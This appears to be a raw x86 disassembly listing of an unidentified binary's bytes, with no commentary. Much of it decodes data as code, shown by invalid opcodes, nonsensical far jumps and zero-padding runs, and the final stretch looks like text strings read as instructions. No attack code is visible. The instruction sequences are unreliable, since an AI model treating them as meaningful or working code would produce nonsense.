  422dd8:	push   ecx
  422dd9:	bound  ecx,QWORD PTR [eax-0x78]
  422ddc:	fsub   DWORD PTR [edx+ebx*8]
  422ddf:	mov    ds:0x71c72769,eax
  422de4:	xchg   edx,eax
  422de5:	and    dl,BYTE PTR [edx+edx*1-0x24]
  422de9:	mov    es,WORD PTR [ebx+ebp*4+0x60a2a531]
  422df0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422df1:	mov    edi,0xa4f9fbcc
  422df6:	xor    BYTE PTR [esi-0x4],bh
  422df9:	jmp    0x965:0xb9d2fe4a
  422e00:	(bad)  [ecx]
  422e02:	ds daa 
  422e04:	aam    0x3d
  422e06:	mov    BYTE PTR [ebp+ebp*8-0x75],dh
  422e0a:	lods   eax,DWORD PTR ds:[esi]
  422e0b:	inc    esp
  422e0c:	push   ss
  422e0d:	loope  0x422dde
  422e0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422e10:	xor    cl,BYTE PTR [ebp+0x364ce6e6]
  422e16:	fild   DWORD PTR [edi]
  422e18:	mov    ds:0x60138423,eax
  422e1d:	retf   0x36c7
  422e20:	sar    DWORD PTR [ecx-0x6a],0x38
  422e24:	sub    eax,DWORD PTR [edi-0x49c9c152]
  422e2a:	xchg   esp,eax
  422e2b:	mov    DWORD PTR [esi+0x4e828538],0x2adf9bec
  422e35:	les    edi,FWORD PTR [edi]
  422e37:	add    BYTE PTR [eax],al
  422e39:	add    BYTE PTR [eax],al
  422e3b:	add    BYTE PTR [eax],al
  422e3d:	add    BYTE PTR [esi],dh
  422e3f:	arpl   WORD PTR [eax-0x10],bp
  422e42:	jge    0x422e3f
  422e44:	mov    esi,0x8c7853e7
  422e49:	daa    
  422e4a:	popf   
  422e4b:	adc    al,BYTE PTR [ecx+0x1d555d6]
  422e51:	add    BYTE PTR [ecx+0x0],ah
  422e54:	add    BYTE PTR [eax],al
  422e56:	xor    BYTE PTR [eax+ebp*1+0x45],ch
  422e5a:	sub    eax,DWORD PTR [ebp-0x2e]
  422e5d:	fs test al,0x6b
  422e60:	push   ecx
  422e61:	add    BYTE PTR [ecx+0x1477e4e6],0xa1
  422e68:	jb     0x422ec3
  422e6a:	cmp    bl,BYTE PTR [eax-0x3b6eda5]
  422e70:	push   ds
  422e71:	imul   esp,eax,0x3c159630
  422e77:	dec    ebp
  422e78:	inc    eax
  422e79:	push   edi
  422e7a:	add    DWORD PTR [eax],ebx
  422e7c:	sub    ebp,DWORD PTR [esi]
  422e7e:	mov    DWORD PTR [edx+0x5a251fe7],0x114b0247
  422e88:	ds ss dec edi
  422e8b:	stos   DWORD PTR es:[edi],eax
  422e8c:	or     ecx,DWORD PTR [ecx+eiz*2+0x4e]
  422e90:	aam    0x51
  422e92:	daa    
  422e93:	cmp    eax,0xe80e7721
  422e98:	add    al,BYTE PTR [edx-0x5c665308]
  422e9e:	repnz sbb ecx,esi
  422ea1:	mov    ebp,0x73ed0ca2
  422ea6:	add    DWORD PTR [ebx+0x221b4e4f],esp
  422eac:	pop    edi
  422ead:	fidivr DWORD PTR [ebx+0x585d8d26]
  422eb3:	(bad)  
  422eb4:	pop    ebp
  422eb5:	nop
  422eb6:	mov    es,WORD PTR [eax]
  422eb8:	add    BYTE PTR [eax],al
  422eba:	add    BYTE PTR [eax],al
  422ebc:	add    BYTE PTR [eax],al
  422ebe:	daa    
  422ebf:	push   ecx
  422ec0:	imul   esi,DWORD PTR [ecx-0x28004681],0x8274b3d8
  422eca:	retf   
  422ecb:	ja     0x422f38
  422ecd:	jae    0x422e57
  422ecf:	fadd   QWORD PTR [ecx]
  422ed1:	add    BYTE PTR [ecx+0x0],ah
  422ed4:	add    BYTE PTR [eax],al
  422ed6:	loopne 0x422ea8
  422ed8:	std    
  422ed9:	mov    al,ds:0xb2645d3d
  422ede:	stc    
  422edf:	xor    cl,ch
  422ee1:	xchg   edx,eax
  422ee2:	mov    ebx,0xaa8df62b
  422ee7:	sub    edi,edx
  422ee9:	sbb    al,0x2b
  422eeb:	pushf  
  422eec:	jmp    0x716a:0x2cdb1eb5
  422ef3:	int3   
  422ef4:	inc    ebp
  422ef5:	int    0x3d
  422ef7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422ef8:	ficomp DWORD PTR [edx]
  422efa:	jg     0x422f30
  422efc:	adc    bh,dl
  422efe:	jbe    0x422ed1
  422f00:	in     eax,0x5f
  422f02:	push   esi
  422f03:	mov    bh,0xc5
  422f05:	cmp    dl,BYTE PTR [ebp+0x4f]
  422f08:	test   eax,0xbc6efff3
  422f0d:	das    
  422f0e:	inc    ebx
  422f0f:	pusha  
  422f10:	sar    BYTE PTR [esi+0x1fbf7df1],1
  422f16:	jo     0x422f1e
  422f18:	adc    eax,0x351ddce3
  422f1d:	mov    edi,0x3967a2e3
  422f22:	or     al,0x18
  422f24:	jecxz  0x422ee7
  422f26:	cmp    dl,BYTE PTR [ecx+0x77a825e6]
  422f2c:	cmp    esp,DWORD PTR [ebp+0x4b]
  422f2f:	nop
  422f30:	sbb    eax,0x18597649
  422f35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422f36:	mov    ebp,0x0
  422f3b:	add    BYTE PTR [eax],al
  422f3d:	add    BYTE PTR [edi],ah
  422f3f:	ss lahf 
  422f41:	xor    DWORD PTR [edi+0x1536afb9],ebx
  422f47:	and    eax,0x4675075b
  422f4c:	daa    
  422f4d:	cld    
  422f4e:	jmp    0x6142312f
  422f53:	add    BYTE PTR [eax],al
  422f55:	add    dl,al
  422f57:	sub    DWORD PTR [esi+ecx*4],eax
  422f5a:	xor    bh,dl
  422f5c:	push   ebp
  422f5d:	xchg   esp,eax
  422f5e:	lock adc BYTE PTR gs:[ecx+0x5d],bh
  422f63:	xchg   ecx,eax
  422f64:	push   bx
  422f66:	xor    ch,dl
  422f68:	jmp    0xa2bd:0x828f05b4
  422f6f:	(bad)  
  422f70:	fdiv   st(5),st
  422f72:	pushw  0xaf56
  422f76:	xor    BYTE PTR [ecx-0x7f],bl
  422f79:	and    al,0xbb
  422f7b:	scas   al,BYTE PTR es:[edi]
  422f7c:	sti    
  422f7d:	jmp    0xbbe9c8b8
  422f82:	cs inc ecx
  422f84:	sbb    ecx,edi
  422f86:	loop   0x422f79
  422f88:	test   eax,0x1cbd4aec
  422f8d:	retf   0xf27d
  422f90:	scas   al,BYTE PTR es:[edi]
  422f91:	leave  
  422f92:	arpl   WORD PTR [edi-0x4c399bd7],bx
  422f98:	ret    
  422f99:	pop    ebx
  422f9a:	add    DWORD PTR [ebx+0x4],0xffffffbe
  422f9e:	fmul   st(5),st
  422fa0:	bound  edi,QWORD PTR [edi]
  422fa2:	rcr    edx,1
  422fa4:	out    dx,eax
  422fa5:	push   ebx
  422fa6:	push   esp
  422fa7:	fnstcw WORD PTR [esi+ebx*4+0x4afda6e5]
  422fae:	sbb    ecx,esi
  422fb0:	das    
  422fb1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422fb2:	and    BYTE PTR [ebx],dl
  422fb4:	loop   0x422f40
  422fb6:	popf   
  422fb7:	add    BYTE PTR [eax],al
  422fb9:	add    BYTE PTR [eax],al
  422fbb:	add    BYTE PTR [eax],al
  422fbd:	add    BYTE PTR [edi],dh
  422fbf:	(bad)  
  422fc0:	out    0xc2,eax
  422fc2:	mul    ebx
  422fc4:	aaa    
  422fc5:	cmc    
  422fc6:	xchg   ecx,eax
  422fc7:	call   0xcd05:0x2418eef4
  422fce:	dec    edx
  422fcf:	fld    QWORD PTR [ecx]
  422fd1:	add    BYTE PTR [ecx+0x0],ah
  422fd4:	add    BYTE PTR [eax],al
  422fd6:	xor    BYTE PTR [edi-0x22],0xb4
  422fda:	add    BYTE PTR [ebx-0x4de430a8],al
  422fe0:	lds    ecx,FWORD PTR ds:0xfe4efe2f
  422fe6:	fdivp  st(6),st
  422fe8:	(bad)  
  422fe9:	or     eax,0x96cfbf34
  422fee:	(bad)  
  422fef:	sbb    al,0xf
  422ff1:	add    al,bh
  422ff3:	xchg   esp,eax
  422ff4:	test   BYTE PTR [edi-0x614cf324],al
  422ffa:	ret    
  422ffb:	aas    
  422ffc:	enter  0x8508,0xca
  423000:	inc    ebx
  423001:	and    DWORD PTR [esi+0x72e24b66],esp
  423007:	or     BYTE PTR [edi+0x361f3dde],dl
  42300d:	inc    esp
  42300e:	inc    ebp
  42300f:	lahf   
  423010:	int3   
  423011:	sub    BYTE PTR [eax],0xe9
  423014:	jg     0x42301a
  423016:	push   ecx
  423017:	sbb    ecx,esp
  423019:	aas    
  42301a:	mov    ebp,0xa5002999
  42301f:	ror    edi,cl
  423021:	mov    cl,bl
  423023:	push   0xd02a5c83
  423028:	imul   eax,ebp,0xffffffb2
  42302b:	popf   
  42302c:	imul   edx,DWORD PTR [ecx-0x4d],0x80cd0658
  423033:	adc    edi,0xbd3d
  423039:	add    BYTE PTR [eax],al
  42303b:	add    BYTE PTR [eax],al
  42303d:	add    BYTE PTR [esi],dl
  42303f:	aad    0xdf
  423041:	out    dx,eax
  423042:	fucomip st,st(7)
  423044:	ss std 
  423046:	cmp    BYTE PTR [esi+0x72045f3a],al
  42304c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42304d:	pop    ecx
  42304e:	stos   DWORD PTR es:[edi],eax
  42304f:	fld    QWORD PTR [ecx]
  423051:	add    BYTE PTR [ecx+0x0],ah
  423054:	add    BYTE PTR [eax],al
  423056:	or     eax,0x1c61784c
  42305b:	adc    BYTE PTR [ebp+0x7c647dff],bh
  423061:	fcmove st,st(7)
  423063:	and    dh,0x23
  423066:	sbb    eax,0x512367b0
  42306b:	and    al,0x81
  42306d:	inc    esp
  42306e:	imul   ebp,DWORD PTR [edx-0x73ab2a50],0xffffffd0
  423075:	lods   eax,DWORD PTR ds:[esi]
  423076:	sbb    al,0x4d
  423078:	daa    
  423079:	mov    dh,0xb7
  42307b:	ins    BYTE PTR es:[edi],dx
  42307c:	pop    ecx
  42307d:	inc    esp
  42307e:	mov    ds:0x91630b3c,eax
  423083:	xchg   esi,eax
  423084:	popa   
  423085:	stc    
  423086:	and    BYTE PTR [edi+0x3c7f7c62],ch
  42308c:	pushf  
  42308d:	aas    
  42308e:	(bad)  
  42308f:	mov    dh,0x4
  423091:	sar    ecx,0xf0
  423094:	xor    bl,dl
  423096:	push   es
  423097:	int    0xaa
  423099:	xchg   esp,eax
  42309a:	cmc    
  42309b:	mov    BYTE PTR [eax-0x3c553b41],0x39
  4230a2:	iret   
  4230a3:	push   0x46887941
  4230a8:	inc    ecx
  4230a9:	ret    
  4230aa:	test   DWORD PTR [edi+ebp*8+0x2f3dcb13],edi
  4230b1:	inc    esi
  4230b2:	std    
  4230b3:	mov    cl,0x3b
  4230b5:	ror    BYTE PTR [eax+0x0],1
  4230b8:	add    BYTE PTR [eax],al
  4230ba:	add    BYTE PTR [eax],al
  4230bc:	add    BYTE PTR [eax],al
  4230be:	outs   dx,BYTE PTR ds:[esi]
  4230bf:	jbe    0x4230a5
  4230c1:	retf   0xdafc
  4230c4:	outs   dx,BYTE PTR ds:[esi]
  4230c5:	neg    BYTE PTR [eax]
  4230c7:	xchg   edx,eax
  4230c8:	xchg   DWORD PTR [edi+0x6b2f716c],edx
  4230ce:	or     al,0xde
  4230d0:	add    DWORD PTR [eax],eax
  4230d2:	popa   
  4230d3:	add    BYTE PTR [eax],al
  4230d5:	add    BYTE PTR [edx+0x77],cl
  4230d8:	clc    
  4230d9:	lods   al,BYTE PTR ds:[esi]
  4230da:	jns    0x4230fa
  4230dc:	sbb    DWORD PTR ds:0xf852b596,esp
  4230e2:	dec    eax
  4230e3:	adc    BYTE PTR [edx-0x27bc4911],bl
  4230e9:	mov    cl,0x5e
  4230eb:	loope  0x4230d0
  4230ed:	jp     0x4230d9
  4230ef:	sub    al,0xe7
  4230f1:	mov    eax,0xa937ddbc
  4230f6:	call   0x169aeef
  4230fb:	retf   
  4230fc:	not    ebx
  4230fe:	sub    edi,edi
  423100:	addr16 or esi,eax
  423103:	rcl    ecx,0xcd
  423106:	lds    edi,FWORD PTR [ebx+0x4026a6c5]
  42310c:	mov    ecx,ebx
  42310e:	stos   DWORD PTR es:[edi],eax
  42310f:	ins    BYTE PTR es:[edi],dx
  423110:	outs   dx,BYTE PTR ds:[esi]
  423111:	xor    eax,0xd3aacbb
  423116:	xchg   esi,eax
  423117:	std    
  423118:	push   es
  423119:	add    DWORD PTR [edi+0x239534d],ebp
  42311f:	mov    bl,0x8e
  423121:	mov    edi,0x403408db
  423126:	ret    0xc410
  423129:	mov    gs,WORD PTR [edx]
  42312b:	jo     0x42312f
  42312d:	call   0xc587:0x92e80d4a
  423134:	dec    ebp
  423135:	xlat   BYTE PTR ds:[ebx]
  423136:	mov    ds:0x0,al
  42313b:	add    BYTE PTR [eax],al
  42313d:	add    BYTE PTR [edx],bh
  42313f:	push   edx
  423140:	les    ecx,FWORD PTR [edi]
  423142:	in     al,dx
  423143:	lahf   
  423144:	sti    
  423145:	ja     0x42313d
  423147:	rcl    DWORD PTR [eax+0x50b878d3],1
  42314d:	sti    
  42314e:	ins    DWORD PTR es:[edi],dx
  42314f:	fiadd  WORD PTR [ecx]
  423151:	add    BYTE PTR [ecx+0x0],ah
  423154:	add    BYTE PTR [eax],al
  423156:	cmp    edi,DWORD PTR [edx+0x5]
  423159:	dec    ecx
  42315a:	pop    ss
  42315b:	mov    WORD PTR [edi],cs
  42315d:	mov    ebx,0x10b915ea
  423162:	in     eax,dx
  423163:	lods   eax,DWORD PTR ds:[esi]
  423164:	shr    edx,cl
  423166:	stos   DWORD PTR es:[edi],eax
  423167:	jmp    0xad5e:0xee32e7f3
  42316e:	mov    eax,0x776d7a6b
  423173:	repz mov al,0x34
  423176:	in     al,dx
  423177:	enter  0x35b9,0x82
  42317b:	jmp    0x464586c3
  423180:	xchg   BYTE PTR [eax],dh
  423182:	in     eax,dx
  423183:	mov    al,ds:0xde426d9c
  423188:	cmp    al,0x61
  42318a:	dec    esp
  42318b:	loopne 0x423125
  42318d:	(bad)  
  42318e:	cmp    BYTE PTR [ebp+0x1f],bl
  423191:	shl    BYTE PTR ds:0x1a403069,0x61
  423198:	cmp    eax,0x27404837
  42319d:	mov    eax,0x3e4b7042
  4231a2:	mov    WORD PTR [eax-0x10764eeb],gs
  4231a8:	(bad)  
  4231a9:	mov    ebx,0x7071ac92
  4231ae:	cmp    al,0x96
  4231b0:	mov    al,0xe7
  4231b2:	jecxz  0x42321a
  4231b4:	xor    BYTE PTR [ebx-0x52],bl
  4231b7:	add    BYTE PTR [eax],al
  4231b9:	add    BYTE PTR [eax],al
  4231bb:	add    BYTE PTR [eax],al
  4231bd:	add    BYTE PTR [ebx-0x4293427d],dl
  4231c3:	jle    0x423198
  4231c5:	call   DWORD PTR [eax-0x20]
  4231c8:	cli    
  4231c9:	call   0xdece:0x42f89218
  4231d0:	add    DWORD PTR [eax],eax
  4231d2:	popa   
  4231d3:	add    BYTE PTR [eax],al
  4231d5:	add    cl,dl
  4231d7:	gs sbb eax,0xfb6510
  4231dd:	aas    
  4231de:	pop    ss
  4231df:	fstp   TBYTE PTR [ebx-0x12]
  4231e2:	das    
  4231e3:	repz test edi,ecx
  4231e6:	jbe    0x423197
  4231e8:	jle    0x4231c6
  4231ea:	sub    BYTE PTR [esi],dl
  4231ec:	sub    edx,DWORD PTR [ebp+eax*4+0x70]
  4231f0:	and    eax,0x96cff28f
  4231f5:	mov    ds:0xdc356967,al
  4231fa:	iret   
  4231fb:	cmp    al,ah
  4231fd:	test   eax,0xb17cc6be
  423202:	adc    DWORD PTR [eax-0x50],esi
  423205:	lock bound ebx,QWORD PTR [ecx]
  423208:	sub    eax,0xc43c14a2
  42320d:	dec    ecx
  42320e:	frstor [esp+eax*1+0x5b8345ca]
  423215:	inc    ecx
  423216:	or     bl,BYTE PTR [ebx]
  423218:	sub    DWORD PTR [ebp-0x2cbcceb3],edi
  42321e:	mov    bl,0x36
  423220:	push   edx
  423221:	cmp    BYTE PTR [ebx-0x3d33045c],bh
  423227:	shl    BYTE PTR [esi-0x1a],0xa6
  42322b:	push   edi
  42322c:	cmc    
  42322d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42322e:	xchg   edi,eax
  42322f:	push   ss
  423230:	push   ebp
  423231:	arpl   WORD PTR [ecx+0x22d3b38b],di
  423237:	add    BYTE PTR [eax],al
  423239:	add    BYTE PTR [eax],al
  42323b:	add    BYTE PTR [eax],al
  42323d:	add    ah,bl
  42323f:	fincstp 
  423241:	shl    bh,0xee
  423244:	(bad)  
  423245:	frstor [ecx+eax*1]
  423248:	pop    ebp
  423249:	dec    edi
  42324a:	pusha  
  42324b:	pop    ss
  42324c:	popf   
  42324d:	or     al,0x2f
  42324f:	fild   WORD PTR [ecx]
  423251:	add    BYTE PTR [ecx+0x0],ah
  423254:	add    BYTE PTR [eax],al
  423256:	xor    DWORD PTR [ebx],edx
  423258:	jecxz  0x4232a9
  42325a:	lahf   
  42325b:	mov    ebx,0x368d1ca1
  423260:	mov    bl,0x7b
  423262:	pop    ds
  423263:	aas    
  423264:	inc    ebx
  423265:	pop    ss
  423266:	pop    ebp
  423267:	jns    0x423272
  423269:	sub    al,0x91
  42326b:	test   BYTE PTR [ebp+0x21],0xdf
  42326f:	std    
  423270:	fild   DWORD PTR [esi-0x35ff9e64]
  423276:	inc    ecx
  423277:	lods   eax,DWORD PTR ds:[esi]
  423278:	cwde   
  423279:	xchg   esp,eax
  42327a:	js     0x423291
  42327c:	jo     0x42322e
  42327e:	das    
  42327f:	jbe    0x4232f2
  423281:	dec    edx
  423282:	xchg   esi,eax
  423283:	ret    0x6855
  423286:	(bad)  
  423288:	add    DWORD PTR ds:0xedb638ff,0xffffffd8
  42328f:	in     eax,dx
  423290:	shr    DWORD PTR [edi],1
  423292:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423293:	push   ebx
  423294:	pop    ecx
  423295:	ins    DWORD PTR es:[edi],dx
  423296:	imul   ebp,DWORD PTR [eax+0x5d800e10],0xffffffb8
  42329d:	cmp    cl,al
  42329f:	dec    esp
  4232a0:	test   BYTE PTR [eax+ebx*4],ah
  4232a3:	adc    ebx,DWORD PTR [ebp+0x42125f38]
  4232a9:	pop    es
  4232aa:	or     DWORD PTR [ecx+0x4f],edi
  4232ad:	inc    ebx
  4232ae:	jg     0x4232c5
  4232b0:	sbb    DWORD PTR [esi+0x4e9afb36],esp
  4232b6:	add    BYTE PTR ds:[eax],al
  4232b9:	add    BYTE PTR [eax],al
  4232bb:	add    BYTE PTR [eax],al
  4232bd:	add    BYTE PTR [edi-0x5e],ch
  4232c0:	aam    0x2a
  4232c2:	fnstsw WORD PTR [esi-0x1]
  4232c5:	out    0x52,eax
  4232c7:	fcmovu st,st(5)
  4232c9:	in     eax,0x14
  4232cb:	es jae 0x42326e
  4232ce:	nop
  4232cf:	fild   WORD PTR [ecx]
  4232d1:	add    BYTE PTR [ecx+0x0],ah
  4232d4:	add    BYTE PTR [eax],al
  4232d6:	addr16 jg 0x423272
  4232d9:	cwde   
  4232da:	hlt    
  4232db:	test   al,0x9d
  4232dd:	popa   
  4232de:	stos   DWORD PTR es:[edi],eax
  4232df:	cmc    
  4232e0:	mov    DWORD PTR [ebx+edi*1],edi
  4232e3:	dec    ebp
  4232e4:	push   ebx
  4232e5:	or     al,cl
  4232e7:	lahf   
  4232e8:	jns    0x423302
  4232ea:	iret   
  4232eb:	mov    ds:0x4c7b5f61,al
  4232f0:	adc    al,0xb5
  4232f2:	sub    ch,BYTE PTR [ecx]
  4232f4:	aaa    
  4232f5:	pop    esp
  4232f6:	fnsave [ebx+0xa]
  4232f9:	sbb    esp,0xffffffe6
  4232fc:	lock in al,dx
  4232fe:	out    0x91,al
  423300:	jb     0x4232d1
  423302:	aas    
  423303:	sub    bl,0x83
  423306:	or     dl,BYTE PTR [ecx]
  423308:	cmp    DWORD PTR [ebp-0x4],0xffffffeb
  42330c:	mov    ah,0xc5
  42330e:	nop
  42330f:	push   es
  423310:	fiadd  WORD PTR [eax]
  423312:	push   eax
  423313:	dec    eax
  423314:	in     eax,0xc7
  423316:	xor    al,0x18
  423318:	out    0x2c,eax
  42331a:	jge    0x42332a
  42331c:	iret   
  42331d:	mov    dh,0x98
  42331f:	push   ds
  423320:	push   ds
  423321:	loope  0x4232b3
  423323:	xchg   esp,eax
  423324:	xor    DWORD PTR ss:[ebp+0x16e0fd2d],ebx
  42332b:	cld    
  42332c:	jne    0x423381
  42332e:	mov    dh,0xeb
  423330:	dec    esi
  423331:	inc    esi
  423332:	xor    DWORD PTR [edi],ebp
  423334:	cmp    dh,dh
  423336:	and    eax,0x0
  42333b:	add    BYTE PTR [eax],al
  42333d:	add    cl,bh
  42333f:	sbb    al,al
  423341:	inc    esi
  423342:	jecxz  0x423322
  423344:	(bad)  
  423345:	mov    edi,0xe1f1bc83
  42334a:	mov    dh,dh
  42334c:	mov    BYTE PTR [esi+0x1dff1],cl
  423352:	popa   
  423353:	add    BYTE PTR [eax],al
  423355:	add    dh,ah
  423357:	fld    TBYTE PTR [ecx+eiz*8+0x6a30836e]
  42335e:	in     eax,0x97
  423360:	scas   eax,DWORD PTR es:[edi]
  423361:	stc    
  423362:	pop    ds
  423363:	xchg   DWORD PTR [ebx+ebx*8+0xb],edi
  423367:	icebp  
  423368:	adc    bl,bl
  42336a:	inc    esi
  42336b:	mov    ebp,0x8036fc40
  423370:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423371:	in     eax,0x5c
  423373:	bound  ebp,QWORD PTR [eax-0x1630821f]
  423379:	test   eax,0xb4d077
  42337e:	xor    ecx,eax
  423380:	push   eax
  423381:	jo     0x423321
  423383:	test   DWORD PTR [ecx-0x23],edx
  423386:	xchg   edi,eax
  423387:	dec    ebp
  423388:	jmp    0x42337b
  42338a:	cmp    DWORD PTR [ecx-0x4b0a9cae],edi
  423390:	loopne 0x4233f5
  423392:	cdq    
  423393:	lea    ebp,[ecx]
  423395:	scas   al,BYTE PTR es:[edi]
  423396:	test   eax,0x5e483741
  42339b:	imul   eax,esp,0x3e
  42339e:	cmp    al,0x14
  4233a0:	mov    DWORD PTR [eax-0x97a449f],ebx
  4233a6:	jbe    0x4233f5
  4233a8:	not    ah
  4233aa:	stos   BYTE PTR es:[edi],al
  4233ab:	or     al,0x7e
  4233ad:	mov    al,0xac
  4233af:	test   DWORD PTR [ebp+0x13],esp
  4233b2:	and    DWORD PTR [eax+ebp*2],0x57
  4233b6:	retf   
  4233b7:	add    BYTE PTR [eax],al
  4233b9:	add    BYTE PTR [eax],al
  4233bb:	add    BYTE PTR [eax],al
  4233bd:	add    BYTE PTR [ecx+0x3e8336b9],ah
  4233c3:	(bad)  
  4233c4:	mov    ch,0xbb
  4233c6:	icebp  
  4233c7:	and    eax,0x12288c27
  4233cc:	imul   ebx,DWORD PTR [ebp+0x52],0xffffffe0
  4233d0:	add    DWORD PTR [eax],eax
  4233d2:	popa   
  4233d3:	add    BYTE PTR [eax],al
  4233d5:	add    BYTE PTR [ecx+0x6454f481],dh
  4233db:	fucomip st,st(5)
  4233dd:	fstp   QWORD PTR [ebx+esi*2-0x58caf639]
  4233e4:	ja     0x42340c
  4233e6:	mov    esp,0x7dc131c3
  4233eb:	pushf  
  4233ec:	pop    edi
  4233ed:	daa    
  4233ee:	mov    dh,dl
  4233f0:	sahf   
  4233f1:	lods   eax,DWORD PTR ds:[esi]
  4233f2:	daa    
  4233f3:	push   eax
  4233f4:	xor    ah,cl
  4233f6:	out    0x9a,al
  4233f8:	adc    bl,BYTE PTR [ecx]
  4233fa:	(bad)  
  4233fb:	retf   0xe40b
  4233fe:	mov    bh,0x84
  423400:	jl     0x4233f4
  423402:	mov    bl,0x98
  423404:	fs mov eax,0x41019ff7
  42340a:	inc    esp
  42340b:	pop    ebx
  42340c:	or     bh,bl
  42340e:	push   esp
  42340f:	mov    bh,0xd1
  423411:	mov    DWORD PTR [edx+0x7765afcb],ebx
  423417:	jecxz  0x42342d
  423419:	and    al,0xb8
  42341b:	pop    ss
  42341c:	mov    edi,0xe6eb7fd1
  423421:	or     edx,DWORD PTR [edx-0x46]
  423424:	adc    ebp,DWORD PTR ds:0xa5ef438d
  42342a:	jmp    0xe092867a
  42342f:	sub    ecx,DWORD PTR [edi]
  423431:	mov    esp,0xc7e4b2aa
  423436:	push   ss
  423437:	add    BYTE PTR [eax],al
  423439:	add    BYTE PTR [eax],al
  42343b:	add    BYTE PTR [eax],al
  42343d:	add    BYTE PTR [edx],dl
  42343f:	xlat   BYTE PTR ds:[ebx]
  423440:	repz or esi,edi
  423443:	das    
  423444:	cli    
  423445:	fist   WORD PTR [ecx]
  423447:	dec    ebx
  423448:	es nop
  42344a:	mov    ecx,0xb32d0dbc
  42344f:	loopne 0x423452
  423451:	add    BYTE PTR [ecx+0x0],ah
  423454:	add    BYTE PTR [eax],al
  423456:	std    
  423457:	cwde   
  423458:	mov    ecx,0xb2014a4
  42345d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42345e:	push   edi
  42345f:	dec    esi
  423460:	mov    ebx,0x4f7ccadd
  423465:	into   
  423466:	mov    cs,edi
  423468:	sar    esi,0xf7
  42346b:	pop    edx
  42346c:	bnd jne 0x4234d5
  42346f:	fidivr WORD PTR [ecx]
  423471:	sahf   
  423472:	mov    eax,ds:0xabc8cf56
  423477:	out    dx,al
  423478:	or     ebx,edx
  42347a:	push   es
  42347b:	push   cs
  42347c:	pusha  
  42347d:	mov    bh,0x1b
  42347f:	clc    
  423480:	cld    
  423481:	in     al,0x3d
  423483:	adc    al,0x4b
  423485:	aad    0x40
  423487:	gs stos DWORD PTR es:[edi],eax
  423489:	or     ebp,edi
  42348b:	sbb    eax,esi
  42348d:	popf   
  42348e:	(bad)  
  42348f:	hlt    
  423490:	push   edx
  423491:	cmp    DWORD PTR [ecx-0x49],ebp
  423494:	jne    0x4234ad
  423496:	jbe    0x423476
  423498:	fidiv  DWORD PTR [edx+0x69728ab0]
  42349e:	and    BYTE PTR [edx+0xd5b01f5],cl
  4234a4:	(bad)  
  4234a5:	retf   0xabdc
  4234a8:	cwde   
  4234a9:	or     eax,0xd37e10f7
  4234ae:	lahf   
  4234af:	and    eax,DWORD PTR [ecx-0x5a]
  4234b2:	jmp    0x423475
  4234b4:	ins    BYTE PTR es:[edi],dx
  4234b5:	pushf  
  4234b6:	xor    eax,DWORD PTR [eax]
  4234b8:	add    BYTE PTR [eax],al
  4234ba:	add    BYTE PTR [eax],al
  4234bc:	add    BYTE PTR [eax],al
  4234be:	add    al,al
  4234c0:	inc    edx
  4234c1:	add    BYTE PTR [eax+eax*8],al
  4234c4:	inc    edx
  4234c5:	add    BYTE PTR [eax],cl
  4234c7:	rol    BYTE PTR [edx+0x0],0xc
  4234cb:	rol    BYTE PTR [edx+0x0],0x10
  4234cf:	rol    BYTE PTR [edx+0x0],0x14
  4234d3:	rol    BYTE PTR [edx+0x0],0x18
  4234d7:	rol    BYTE PTR [edx+0x0],0x1c
  4234db:	rol    BYTE PTR [edx+0x0],0x57
  4234df:	inc    edi
  4234e0:	cmp    DWORD PTR [edi+0x41],ebx
  4234e3:	pop    eax
  4234e4:	ss push esi
  4234e6:	pop    edi
  4234e7:	cmp    BYTE PTR [eax],al
  4234e9:	inc    ebx
  4234ea:	inc    ebp
  4234eb:	dec    esp
  4234ec:	pop    edi
  4234ed:	pop    eax
  4234ee:	push   edi
  4234ef:	dec    eax
  4234f0:	inc    edx
  4234f1:	add    BYTE PTR [edi+0x50],dl
  4234f4:	xor    eax,0x4641365f
  4234f9:	cmp    DWORD PTR [edx],esi
  4234fb:	xor    ebx,DWORD PTR [edi+0x32]
  4234fe:	aaa    
  4234ff:	add    BYTE PTR [eax+0x48],dl
  423502:	xor    BYTE PTR [edi+0x58],bl
  423505:	push   esp
  423506:	inc    ecx
  423507:	dec    ebp
  423508:	push   ecx
  423509:	pop    edi
  42350a:	inc    esi
  42350b:	push   ebp
  42350c:	cmp    DWORD PTR [eax],eax
  42350e:	push   edi
  42350f:	push   ebp
  423510:	inc    ecx
  423511:	xor    dh,BYTE PTR [ebx]
  423513:	xor    ebx,DWORD PTR [edi+0x4e]
  423516:	add    BYTE PTR [esp+ecx*2+0x4d],dl
  42351a:	cmp    DWORD PTR [edi+0x38],ebx
  42351d:	dec    ecx
  42351e:	cmp    DWORD PTR [edx+0x36],ebx
  423521:	pop    edi
  423522:	dec    edx
  423523:	xor    BYTE PTR [edx+0x34],cl
  423526:	add    BYTE PTR [ecx+eax*2+0x34],cl
  42352a:	xor    esi,DWORD PTR [eax]
  42352c:	pop    edi
  42352d:	inc    edx
  42352e:	dec    ebx
  42352f:	pop    eax
  423530:	pop    eax
  423531:	xor    eax,0x51414d00
  423536:	pop    edi
  423537:	inc    ecx
  423538:	xor    al,BYTE PTR [ebp+0x5f]
  42353b:	inc    ecx
  42353c:	dec    ebx
  42353d:	cmp    DWORD PTR ds:0x5a003939,esi
  423543:	inc    ebp
  423544:	cmp    BYTE PTR [edi+0x4d],bl
  423547:	ss dec eax
  423549:	dec    ebx
  42354a:	add    BYTE PTR [ebp+0x57],al
  42354d:	xor    DWORD PTR [edi+0x31],ebx
  423550:	dec    ebx
  423551:	xor    eax,DWORD PTR [ecx+0x30]
  423554:	push   ebx
  423555:	add    BYTE PTR [edx+esi*1+0x36],al
  423559:	aaa    
  42355a:	pop    edi
  42355b:	push   edx
  42355c:	dec    eax
  42355d:	dec    ebp
  42355e:	cmp    BYTE PTR [edi+0x37],bl
  423561:	inc    esi
  423562:	xor    eax,0x43355500
  423567:	pop    edi
  423568:	pop    ecx
